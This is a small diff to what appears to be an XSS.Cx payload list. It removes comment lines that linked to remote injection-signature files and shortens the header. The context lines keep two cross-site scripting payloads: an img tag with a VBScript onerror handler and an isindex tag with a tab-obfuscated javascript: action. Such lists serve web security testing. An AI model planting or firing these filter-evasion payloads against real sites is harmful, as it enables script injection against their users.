@@ -1,8 +1,4 @@
-/* Remote File Include with HTML TAGS via XSS.Cx  */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-javascript-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-http-header-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-css-injection-signatures-only-fools-dont-use.txt */
-/* Updated September 29, 2014 */
+/* Remote File Include via XSS.Cx  */
 /* RFI START */
 <img language=vbs src=<b onerror=alert#1/1#>
 <isindex action="javas&Tab;cript:alert(1)" type=image>
